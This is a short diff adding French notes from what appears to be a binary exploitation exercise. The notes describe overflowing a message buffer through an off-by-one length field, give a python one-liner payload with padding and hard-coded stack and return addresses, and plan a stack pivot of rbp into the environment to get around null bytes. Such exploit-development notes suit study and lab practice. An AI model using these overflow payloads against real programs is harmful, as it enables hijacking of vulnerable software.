@@ -1,0 +1,10 @@
+Pour l'instant on va faire remplir le name qui va depasser sur la taille du message
+de charactere -1, ce qui va permettre de ne pas arreter decrire au 128eme
+charactere le message, et ce qui va donc nous permettre de faire un overflow lors
+du remplissage du message.
+
+python -c 'print "\xff"*41 + "\n" + "A"*192 + "\x90\xe5\xff\xff\xff\x7f\x00\x00" + "\x8c\x48\x55\x55\x55\x55\x00\x00"'
+
+probleme: des charactere sont \x00 et arrete donc lecriture
+du coup on va basculer rbp sur une stack perso: l'environnement comme ca, tout ce dont
+on a besoin pourra etre ecrit facilement
